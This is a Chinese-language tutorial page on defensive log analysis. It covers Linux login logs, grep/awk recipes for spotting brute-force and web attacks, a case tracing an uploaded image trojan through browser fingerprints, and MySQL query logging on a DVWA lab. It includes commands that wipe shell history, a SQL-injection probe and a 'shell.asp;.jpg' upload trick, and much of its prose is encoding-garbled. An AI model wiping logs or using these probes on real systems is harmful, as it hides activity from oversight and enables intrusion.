/var/log/secure &#35760;&#24405;&#39564;&#35777;&#21644;&#25480;&#26435;&#26041;&#38754;&#30340;&#20449;&#24687;&#65292;&#21482;&#35201;&#28041;&#21450;&#36134;&#21495;&#21644;&#23494;&#30721;&#30340;&#31243;&#24207;&#37117;&#20250;&#35760;&#24405;&#65292;&#27604;&#22914;SSH&#30331;&#24405;&#65292;su&#20999;&#25442;&#29992;&#25143;&#65292;sudo&#25480;&#26435;&#65292;&#29978;&#33267;&#28155;&#21152;&#29992;&#25143;&#21644;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;&#37117;&#20250;&#35760;&#24405;&#22312;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;
</pre>
</div>

<p>
æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ—¥å¿—ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#35760;&#24405;&#65306;/var/log/btmp
&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#65306;/var/log/lastlog
&#30331;&#24405;&#25104;&#21151;&#35760;&#24405;: /var/log/wtmp
&#30331;&#24405;&#26085;&#24535;&#35760;&#24405;&#65306;/var/log/secure
&#30446;&#21069;&#30331;&#24405;&#29992;&#25143;&#20449;&#24687;&#65306;/var/run/utmp
&#21382;&#21490;&#21629;&#20196;&#35760;&#24405;&#65306;history
&#20165;&#28165;&#29702;&#24403;&#21069;&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;&#65306; history -c
</pre>
</div>
</div>
</div>
<div id="outline-container-org14b47e9" class="outline-4">
<h4 id="org14b47e9">æ—¥å¿—åˆ†ææŠ€å·§</h4>
<div class="outline-text-4" id="text-org14b47e9">
</div>
<div id="outline-container-org8dd22bd" class="outline-5">
<h5 id="org8dd22bd">å¸¸ç”¨çš„shellå‘½ä»¤</h5>
<div class="outline-text-5" id="text-org8dd22bd">
<p>
Linuxä¸‹å¸¸ç”¨çš„shellå‘½ä»¤å¦‚ï¼šfindã€grep ã€egrepã€awkã€sed<br>
</p>

<p>
1ã€grepæ˜¾ç¤ºå‰åå‡ è¡Œä¿¡æ¯<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26631;&#20934;unix/linux&#19979;&#30340;grep&#36890;&#36807;&#19979;&#38754;&#21442;&#25968;&#25511;&#21046;&#19978;&#19979;&#25991;&#65306;
grep -C 5 foo file &#26174;&#31034;file&#25991;&#20214;&#37324;&#21305;&#37197;foo&#23383;&#20018;&#37027;&#34892;&#20197;&#21450;&#19978;&#19979;5&#34892;
grep -B 5 foo file &#26174;&#31034;foo&#21450;&#21069;5&#34892;
grep -A 5 foo file &#26174;&#31034;foo&#21450;&#21518;5&#34892;
&#26597;&#30475;grep&#29256;&#26412;&#21495;&#30340;&#26041;&#27861;&#26159;&#65306;grep -V
</pre>
</div>

<p>
2ã€grep æŸ¥æ‰¾å«æœ‰æŸå­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -rn <span style="color: #8b2252;">"hello,world!"</span> *

* &#34920;&#31034;&#24403;&#21069;&#30446;&#24405;&#25152;&#26377;&#25991;&#20214;&#65292;&#20063;&#21487;&#20197;&#26159;&#26576;&#20010;&#25991;&#20214;&#21517;
-r &#26159;&#36882;&#24402;&#26597;&#25214;
-n &#26159;&#26174;&#31034;&#34892;&#21495;
-R &#26597;&#25214;&#25152;&#26377;&#25991;&#20214;&#21253;&#21547;&#23376;&#30446;&#24405;
-i &#24573;&#30053;&#22823;&#23567;&#20889;
</pre>
</div>

<p>
3ã€æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æŸå‡ è¡Œ<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat input_file | tail -n +1000 | head -n 2000 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20174;&#31532;1000&#34892;&#24320;&#22987;&#65292;&#26174;&#31034;2000&#34892;&#12290;&#21363;&#26174;&#31034;1000~2999&#34892;</span>
</pre>
</div>

<p>
4ã€æŸ¥æ‰¾å‘½ä»¤<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">find /etc -name init //&#22312;&#30446;&#24405;/etc&#20013;&#26597;&#25214;&#25991;&#20214;init
</pre>
</div>

<p>
5ã€åªæ˜¾ç¤º/etc/passwdçš„è´¦æˆ·<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /etc/passwd | awk -F <span style="color: #8b2252;">':'</span> <span style="color: #8b2252;">'{print $1}'</span> //awk -F&#25351;&#23450;&#22495;&#20998;&#38548;&#31526;&#20026;<span style="color: #8b2252;">':'</span>&#65292;&#23558;&#35760;&#24405;&#25353;&#25351;&#23450;&#30340;&#22495;&#20998;&#38548;&#31526;&#21010;&#20998;&#22495;&#65292;&#22635;&#20805;&#22495;&#65292;$<span style="color: #a0522d;">0</span>&#21017;&#34920;&#31034;&#25152;&#26377;&#22495;,$<span style="color: #a0522d;">1</span>&#34920;&#31034;&#31532;&#19968;&#20010; &#22495;,$<span style="color: #a0522d;">n&#34920;&#31034;&#31532;n&#20010;&#22495;</span>&#12290;
</pre>
</div>

<p>
6ã€åˆ é™¤å†å²æ“ä½œè®°å½•<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i <span style="color: #8b2252;">'153,$d'</span> .bash_history //&#21024;&#38500;&#21382;&#21490;&#25805;&#20316;&#35760;&#24405;&#65292;&#21482;&#20445;&#30041;&#21069;153&#34892;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgcaa8774" class="outline-5">
<h5 id="orgcaa8774">æ—¥å¿—åˆ†ææŠ€å·§</h5>
<div class="outline-text-5" id="text-orgcaa8774">
<p>
1ã€/var/log/secure<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
grep <span style="color: #8b2252;">"Failed password for root"</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | grep -E -o <span style="color: #8b2252;">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c

3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | perl -e <span style="color: #8b2252;">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c|sort -nr

4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $1,$2,$3,$9,$11}'</span>
</pre>
</div>

<p>
2ã€/var/log/yum.log<br>
è½¯ä»¶å®‰è£…å‡çº§å¸è½½æ—¥å¿—ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[root@bogon ~]# more /var/log/yum.log
Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-org5028939" class="outline-3">
<h3 id="org5028939">Webæ—¥å¿—åˆ†æ</h3>
<div class="outline-text-3" id="text-org5028939">
<p>
Webè®¿é—®æ—¥å¿—è®°å½•äº†WebæœåŠ¡å™¨æ¥æ”¶å¤„ç†è¯·æ±‚åŠè¿è¡Œæ—¶é”™è¯¯ç­‰å„ç§åŸå§‹ä¿¡æ¯ã€‚é€šè¿‡å¯¹WEBæ—¥å¿—è¿›è¡Œçš„å®‰å…¨åˆ†æï¼Œä¸ä»…å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®šä½æ”»å‡»è€…ï¼Œè¿˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿˜åŸæ”»å‡»è·¯å¾„ï¼Œæ‰¾åˆ°ç½‘ç«™å­˜åœ¨çš„å®‰å…¨æ¼æ´å¹¶è¿›è¡Œä¿®å¤ã€‚<br>
</p>

<p>
æˆ‘ä»¬æ¥çœ‹ä¸€æ¡Apacheçš„è®¿é—®æ—¥å¿—ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] <span style="color: #8b2252;">"GET /login.html HTTP/1.1"</span> 200 786 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"</span>
</pre>
</div>

<p>
é€šè¿‡è¿™æ¡Webè®¿é—®æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„å¾—çŸ¥ç”¨æˆ·åœ¨ä»€ä¹ˆIPã€ä»€ä¹ˆæ—¶é—´ã€ä½¿ç”¨ä»€ä¹ˆæ“ä½œç³»ç»Ÿã€ä»€ä¹ˆæµè§ˆå™¨çš„æƒ…å†µä¸‹è®¿é—®äº†ä½ ç½‘ç«™çš„å“ªä¸ªé¡µé¢ï¼Œæ˜¯å¦è®¿é—®æˆåŠŸã€‚<br>
</p>
</div>
<div id="outline-container-orgc0944ca" class="outline-4">
<h4 id="orgc0944ca">æ—¥å¿—åˆ†ææŠ€å·§</h4>
<div class="outline-text-4" id="text-orgc0944ca">
<p>
åœ¨å¯¹WEBæ—¥å¿—è¿›è¡Œå®‰å…¨åˆ†ææ—¶ï¼Œä¸€èˆ¬å¯ä»¥æŒ‰ç…§ä¸¤ç§æ€è·¯å±•å¼€ï¼Œé€æ­¥æ·±å…¥ï¼Œè¿˜åŸæ•´ä¸ªæ”»å‡»è¿‡ç¨‹ã€‚<br>
</p>

<p>
1ã€ç¡®å®šå…¥ä¾µçš„æ—¶é—´èŒƒå›´ï¼Œä»¥æ­¤ä¸ºçº¿ç´¢ï¼ŒæŸ¥æ‰¾è¿™ä¸ªæ—¶é—´èŒƒå›´å†…å¯ç–‘çš„æ—¥å¿—ï¼Œè¿›ä¸€æ­¥æ’æŸ¥ï¼Œæœ€ç»ˆç¡®å®šæ”»å‡»è€…ï¼Œè¿˜åŸæ”»å‡»è¿‡ç¨‹ã€‚<br>
ä¸¾ä¾‹ï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåœ¨webæ—¥å¿—èƒ½çœ‹åˆ°ä»€ä¹ˆï¼Ÿ<br>
GETæ–¹æ³•ï¼šåœ¨webæ—¥å¿—ä¸­ï¼Œé€šè¿‡æ¥å£åœ°å€æˆ‘å°±å¯ä»¥çœ‹åˆ°æ³¨å…¥çš„payloadï¼Œæ¯”å¦‚1â€˜ and 1=1 #<br>
POSTæ–¹æ³•ï¼šé€šè¿‡å¤§é‡çš„è®¿é—®è®°å½•ï¼Œæ‰¾åˆ°æ”»å‡»çš„æ¥å£åœ°å€ï¼Œæ ¹æ®å“åº”ç åˆ¤æ–­æ˜¯å¦æ”»å‡»æˆåŠŸï¼Œä»¥åŠç¡®è®¤è¯¥æ¥<br>
å£æ˜¯å¦ä¸æ•°æ®åº“äº§ç”Ÿäº¤äº’ã€‚<br>
</p>

<p>
2ã€æ”»å‡»è€…åœ¨å…¥ä¾µç½‘ç«™åï¼Œé€šå¸¸ä¼šç•™ä¸‹åé—¨ç»´æŒæƒé™ï¼Œä»¥ä¾¿å†æ¬¡è®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œå¹¶ä»¥æ­¤ä¸ºçº¿ç´¢æ¥å±•å¼€åˆ†æã€‚<br>
</p>

<p>
åé—¨æ€ä¹ˆæ¥çš„ï¼Ÿ &#x2013;&gt; æŸ¥çœ‹webæ—¥å¿—ï¼Œæ ¹æ®åé—¨æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´å»æŸ¥çœ‹å‰åçš„æ—¥å¿— &#x2013;&gt; çœ‹çœ‹ç³»ç»Ÿç™»é™†æ—¥å¿—<br>
</p>

<p>
å¸¸ç”¨åˆ†æå·¥å…·ï¼š<br>
</p>
<ul class="org-ul">
<li>Windowä¸‹ï¼Œæ¨èç”¨ EmEditor/Notepad++ è¿›è¡Œæ—¥å¿—åˆ†æï¼Œæ”¯æŒå¤§æ–‡æœ¬ï¼Œæœç´¢æ•ˆç‡ä¸é”™ã€‚<br></li>
<li>Linuxä¸‹ï¼Œä½¿ç”¨Shellå‘½ä»¤ç»„åˆæŸ¥è¯¢åˆ†æã€‚ä¸€èˆ¬ç»“åˆgrepã€awkç­‰å‘½ä»¤ç­‰å®ç°å¸¸ç”¨çš„æ—¥å¿—åˆ†æç»Ÿè®¡æŠ€å·§ã€‚<br></li>
</ul>

<p>
Apacheæ—¥å¿—åˆ†ææŠ€å·§ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#21015;&#20986;&#24403;&#22825;&#35775;&#38382;&#27425;&#25968;&#26368;&#22810;&#30340;IP&#21629;&#20196;&#65306;
cut -d- -f 1 log_file|uniq -c | sort -rn | head -20

2&#12289;&#26597;&#30475;&#24403;&#22825;&#26377;&#22810;&#23569;&#20010;IP&#35775;&#38382;&#65306;
awk <span style="color: #8b2252;">'{print $1}'</span> log_file|sort | uniq | wc -l

3&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;&#39029;&#38754;&#34987;&#35775;&#38382;&#30340;&#27425;&#25968;&#65306;
grep <span style="color: #8b2252;">"/index.php"</span> log_file | wc -l

4&#12289;&#26597;&#30475;&#27599;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#22810;&#23569;&#20010;&#39029;&#38754;&#65306;
awk <span style="color: #8b2252;">'{++S[$1]} END {for (a in S) print a,S[a]}'</span> log_file

5&#12289;&#23558;&#27599;&#20010;IP&#35775;&#38382;&#30340;&#39029;&#38754;&#25968;&#36827;&#34892;&#20174;&#23567;&#21040;&#22823;&#25490;&#24207;&#65306;
awk <span style="color: #8b2252;">'{++S[$1]} END {for (a in S) print S[a],a}'</span> log_file | sort -n

6&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#21738;&#20123;&#39029;&#38754;&#65306;
grep ^IP log_file| awk <span style="color: #8b2252;">'{print $1,$7}'</span>

7&#12289;&#21435;&#25481;&#25628;&#32034;&#24341;&#25806;&#32479;&#35745;&#24403;&#22825;&#30340;&#39029;&#38754;&#65306;
awk <span style="color: #8b2252;">'{print $12,$1}'</span> log_file | grep ^<span style="color: #8b2252;">\"</span>Mozilla | awk <span style="color: #8b2252;">'{print $2}'</span> | sort | uniq | wc -l

8&#12289;&#26597;&#30475;2022&#24180;6&#26376;21&#26085;14&#26102;&#36825;&#19968;&#20010;&#23567;&#26102;&#20869;&#26377;&#22810;&#23569;IP&#35775;&#38382;:
awk <span style="color: #8b2252;">'{print $4,$1}'</span> log_file | grep 21/Jun/2022:14 | awk <span style="color: #8b2252;">'{print $2}'</span>| sort | uniq | wc -l
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd36b7fa" class="outline-4">
<h4 id="orgd36b7fa">æ—¥å¿—åˆ†ææ¡ˆä¾‹</h4>
<div class="outline-text-4" id="text-orgd36b7fa">
<p>
å®ä¾‹ï¼šé€šè¿‡nginxä»£ç†è½¬å‘åˆ°æŸå†…ç½‘æœåŠ¡å™¨ï¼Œå†…ç½‘æœåŠ¡å™¨æŸç«™ç‚¹ç›®å½•ä¸‹è¢«ä¸Šä¼ äº†å¤šä¸ªå›¾ç‰‡æœ¨é©¬ï¼Œè™½ç„¶IISä¸‹ä¸èƒ½è§£æï¼Œä½†è¿˜æ˜¯æƒ³æ‰¾å‡ºè°é€šè¿‡ä»€ä¹ˆè·¯å¾„ä¸Šä¼ çš„ã€‚<br>
</p>

<p>
åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼šç”±äºè®¾ç½®äº†ä»£ç†è½¬å‘ï¼Œåªè®°å½•äº†ä»£ç†æœåŠ¡å™¨çš„IPï¼ˆå³nginxï¼‰ï¼Œå¹¶æ²¡æœ‰è®°å½•è®¿é—®è€…IPï¼Ÿè¿™æ—¶å€™ï¼Œå¦‚ä½•å»è¯†åˆ«ä¸åŒçš„è®¿é—®è€…å’Œæ”»å‡»æºå‘¢ï¼Ÿ<br>
</p>

<p>
è¿™æ˜¯ç®¡ç†å‘˜æ—¥å¿—é…ç½®ä¸å½“çš„é—®é¢˜ï¼Œä½†å¥½åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨æŒ‡çº¹æ¥å®šä½ä¸åŒçš„è®¿é—®æ¥æºï¼Œè¿˜åŸæ”»å‡»è·¯å¾„ã€‚<br>
</p>

<p>
1ã€å®šä½æ”»å‡»æº<br>
é¦–å…ˆè®¿é—®å›¾ç‰‡æœ¨é©¬çš„è®°å½•ï¼Œåªæ‰¾åˆ°äº†ä¸€æ¡ï¼Œç”±äºæ‰€æœ‰è®¿é—®æ—¥å¿—åªè®°å½•äº†ä»£ç†IPï¼Œå¹¶ä¸èƒ½é€šè¿‡IPæ¥è¿˜åŸæ”»å‡»è·¯å¾„ï¼Œè¿™æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨æµè§ˆå™¨æŒ‡çº¹æ¥å®šä½ã€‚<br>
</p>

<p>
shell.asp;.jpg<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">more u_ex180408.log | grep <span style="color: #8b2252;">"asp;."</span>

... /up/dj/2012.asp;.jgp  ...
</pre>
</div>


<figure id="orgb5dc032">
<img src="./images/img_20230814_170554.png" alt="img_20230814_170554.png" width="60%"><br>

</figure>

<p>
æµè§ˆå™¨æŒ‡çº¹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Mozilla/4.0+ (compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.N ET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)
</pre>
</div>

<p>
2ã€æœç´¢ç›¸å…³æ—¥å¿—è®°å½•<br>
é€šè¿‡ç­›é€‰ä¸è¯¥æµè§ˆå™¨æŒ‡çº¹æœ‰å…³çš„æ—¥å¿—è®°å½•ï¼Œå¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°æ”»å‡»è€…çš„æ”»å‡»è·¯å¾„ã€‚<br>
</p>


<figure id="orgd2ae100">
<img src="./images/img_20230814_170909.png" alt="img_20230814_170909.png" width="60%"><br>

</figure>

<p>
3ã€å¯¹æ‰¾åˆ°çš„è®¿é—®æ—¥å¿—è¿›è¡Œè§£è¯»ï¼Œæ”»å‡»è€…å¤§è‡´çš„è®¿é—®è·¯å¾„å¦‚ä¸‹<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">A&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#39318;&#39029;&#21644;&#30331;&#24405;&#39029;
B&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;MsgSjlb.aspx&#21644;MsgSend.aspx
C&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;Xzuser.aspx
D&#12289;&#25915;&#20987;&#32773;&#22810;&#27425;POST&#65288;&#24576;&#30097;&#36890;&#36807;&#36825;&#20010;&#39029;&#38754;&#19978;&#20256;&#27169;&#22359;&#32570;&#38519;&#65289;
E&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#20102;&#22270;&#29255;&#26408;&#39532;
</pre>
</div>

<p>
æ‰“å¼€ç½‘ç«™ï¼Œè®¿é—®Xzuser.aspxï¼Œç¡®è®¤æ”»å‡»è€…é€šè¿‡è¯¥é¡µé¢çš„è¿›è¡Œæ–‡ä»¶ä¸Šä¼ äº†å›¾ç‰‡æœ¨é©¬ï¼ŒåŒæ—¶ï¼Œå‘ç°ç½‘ç«™äº†å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…è®¿é—®ç‰¹å®šURLï¼Œæ— éœ€ç™»å½•å³å¯è¿›å…¥åå°ç•Œé¢ã€‚é€šè¿‡æ—¥å¿—åˆ†ææ‰¾åˆ°ç½‘ç«™çš„æ¼æ´ä½ç½®å¹¶è¿›è¡Œä¿®å¤ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org933782d" class="outline-4">
<h4 id="org933782d">æ—¥å¿—ç»Ÿè®¡åˆ†ææŠ€å·§</h4>
<div class="outline-text-4" id="text-org933782d">
<p>
ç»Ÿè®¡çˆ¬è™«ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -E <span style="color: #8b2252;">'Googlebot|Baiduspider'</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{ print $1 }'</span> | sort | uniq
</pre>
</div>

<p>
ç»Ÿè®¡æµè§ˆå™¨ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | grep -v -E <span style="color: #8b2252;">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> | sort | uniq -c | sort -r -n | head -n 100
</pre>
</div>

<p>
IP ç»Ÿè®¡ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">'23/May/2019'</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $1}'</span> | awk -F<span style="color: #8b2252;">'.'</span> <span style="color: #8b2252;">'{print $1"."$2"."$3"."$4}'</span> | sort | uniq -c | sort -r -n | head -n 3
    2206 219.136.134.13
    1497 182.34.15.248
    1431 211.140.143.100 
</pre>
</div>

<p>
ç»Ÿè®¡ç½‘æ®µï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $1}'</span> | awk -F<span style="color: #8b2252;">'.'</span> <span style="color: #8b2252;">'{print $1"."$2"."$3".0"}'</span> | sort | uniq -c | sort -r -n | head -n 200
</pre>
</div>

<p>
ç»Ÿè®¡åŸŸåï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $2}'</span> | sort | uniq -c | sort - rn | more
</pre>
</div>

<p>
HTTP Statusï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $9}'</span> | sort | uniq -c | sort - rn | more
    5056585 304
    1125579 200
    7602 400
    5 301
</pre>
</div>

<p>
URLç»Ÿè®¡ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $7}'</span> | sort | uniq -c | sort - rn | more
</pre>
</div>

<p>
æ–‡ä»¶æµé‡ç»Ÿè®¡ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more

grep <span style="color: #8b2252;">' 200 '</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more
</pre>
</div>

<p>
URLè®¿é—®é‡ç»Ÿè®¡ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $7}'</span> | egrep <span style="color: #8b2252;">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more
</pre>
</div>

<p>
è„šæœ¬è¿è¡Œé€Ÿåº¦ï¼šæŸ¥å‡ºè¿è¡Œé€Ÿåº¦æœ€æ…¢çš„è„šæœ¬<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -v 0$ /www/logs/access.2019-02-23.log | awk -F <span style="color: #8b2252;">'\" '</span> <span style="color: #8b2252;">'{print $4" " $1}'</span> web.log | awk <span style="color: #8b2252;">'{print $1" "$8}'</span> | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt
</pre>
</div>

<p>
IPï¼ŒURL æŠ½å–ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1" "$7}'</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org6a021c3" class="outline-3">
<h3 id="org6a021c3">Mysqlæ—¥å¿—åˆ†æ</h3>
<div class="outline-text-3" id="text-org6a021c3">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šDVWA</b><br>
</p>

<p>
Mysql ä¸­çš„ general_log èƒ½è®°å½•æˆåŠŸè¿æ¥å’Œæ¯æ¬¡æ‰§è¡Œçš„æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒç”¨ä½œå®‰å…¨å¸ƒé˜²çš„ä¸€éƒ¨åˆ†ï¼Œä¸ºæ•…éšœåˆ†ææˆ–é»‘å®¢äº‹ä»¶åçš„è°ƒæŸ¥æä¾›ä¾æ®ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#26597;&#30475;log&#37197;&#32622;&#20449;&#24687;
show variables like <span style="color: #8b2252;">'%general%'</span>;

2&#12289;&#24320;&#21551;&#26085;&#24535;
SET GLOBAL general_log = <span style="color: #8b2252;">'On'</span>;

3&#12289;&#25351;&#23450;&#26085;&#24535;&#25991;&#20214;&#36335;&#24452;
<span style="color: #b22222;">#</span><span style="color: #b22222;">SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';</span>
</pre>
</div>

<p>
æŸ¥çœ‹mysqlæ—¥å¿—æ–‡ä»¶ï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">root@a2c8a6d15492:/# tail /var/log/mysql/mysql.log
                  246 Connect   root@localhost on dvwa
                  245 Quit      
                  246 Quit      
231013  1:34:38   247 Connect   root@localhost on 
                  247 Query     select @@version_comment limit 1
231013  1:34:41   247 Quit      
231013  1:35:07   248 Connect   root@localhost on 
                  248 Query     select @@version_comment limit 1
231013  1:35:34   248 Query     show variables like <span style="color: #8b2252;">'%log%'</span>
231013  1:35:48   248 Quit
</pre>
</div>


<figure id="orgafd6042">
<img src="./images/img_20230814_171916.png" alt="img_20230814_171916.png" width="60%"><br>

</figure>

<p>
æŒ‰åˆ—æ¥è§£æä¸€ä¸‹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#31532;&#19968;&#21015;&#65306;Time
&#21069;&#38754;&#19968;&#20010;&#26159;&#26085;&#26399;&#65292;&#21518;&#38754;&#19968;&#20010;&#26159;&#23567;&#26102;&#21644;&#20998;&#38047;&#65292;&#26377;&#19968;&#20123;&#19981;&#26174;&#31034;&#30340;&#21407;&#22240;&#26159;&#22240;&#20026;&#36825;&#20123;sql&#35821;&#21477;&#20960;&#20046;&#26159;&#21516;&#26102;&#25191;&#34892;&#30340;&#65292;&#25152;&#20197; &#23601;&#19981;&#21478;&#22806;&#35760;&#24405;&#26102;&#38388;&#20102;&#12290;

&#31532;&#20108;&#21015;&#65306;ID
show processlist&#20986;&#26469;&#30340;&#31532;&#19968;&#21015;&#30340;&#32447;&#31243;ID&#65292;&#23545;&#20110;&#38271;&#36830;&#25509;&#21644;&#19968;&#20123;&#27604;&#36739;&#32791;&#26102;&#30340;sql&#35821;&#21477;&#65292;&#20320;&#21487;&#20197;&#31934;&#30830;&#25214;&#20986;&#31350;&#31455;&#26159; &#21738;&#19968;&#20010;&#32447;&#31243;&#22312;&#36816;&#34892;&#12290;

&#31532;&#19977;&#21015;&#65306;Command&#65292;&#25805;&#20316;&#31867;&#22411;
&#27604;&#22914;Connect&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;Query&#23601;&#26159;&#26597;&#35810;&#25968;&#25454;&#24211;(&#22686;&#21024;&#26597;&#25913;&#37117;&#26174;&#31034;&#20026;&#26597;&#35810;)&#65292;&#21487;&#20197;&#29305;&#23450;&#36807;&#28388;&#19968;&#20123;&#25805;&#20316;&#12290;

&#31532;&#22235;&#21015;&#65306;Argument&#65292;&#35814;&#32454;&#20449;&#24687;
